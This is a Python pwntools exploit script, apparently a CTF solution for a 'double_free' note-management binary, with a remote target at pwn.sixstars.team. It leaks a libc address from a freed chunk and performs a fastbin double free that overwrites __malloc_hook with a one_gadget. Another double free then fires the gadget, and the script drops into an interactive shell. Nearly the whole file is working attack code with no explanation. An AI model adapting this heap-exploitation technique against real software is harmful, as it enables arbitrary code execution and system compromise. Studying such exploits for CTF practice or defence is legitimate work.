#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./double_free"
elf=ELF(pwn_file)
libc=elf.libc
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team", 22022)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def add_note(size):
    r.sendlineafter("> ","1")
    r.sendlineafter("input size:",str(size))

def edit_note(index,content):
    r.sendlineafter("> ","3")
    r.sendlineafter("Index:", str(index))
    r.recvuntil("Note:")
    r.sendline(content+ " ")
    r.recvuntil("Done!")

def deletenote(index):
    r.sendlineafter("> ","4")
    r.sendlineafter("Index:", str(index))

def show_note(index):
    r.sendlineafter("> ", "2")
    r.sendlineafter("Index:", str(index))



add_note(0x140) # 0
add_note(0x30) # 1
deletenote(0)
#addnote(0x100)
#editnote(1')
show_note(0)

w = r.recv(11)[-6:]
main_arena_80_addr = u64(w + chr(0)*2)

print hex(main_arena_80_addr)
libc.address = main_arena_80_addr - (0x7ffff7dd1b78 - 0x7ffff7a0d000)
print hex(libc.address)



add_note(0x68) #2
add_note(0x68) #3
deletenote(2)
deletenote(3)
deletenote(2)

one_gadget = libc.address + 0xf02a4

malloc_block = libc.sym['__malloc_hook'] -0x23 

add_note(0x68) #4
edit_note(4,p64(malloc_block))
add_note(0x68) #5
add_note(0x68) #6
payload2 = 'a'*19 + p64(one_gadget)
add_note(0x68) #7
edit_note(7,payload2)


deletenote(5)
deletenote(5)

r.interactive()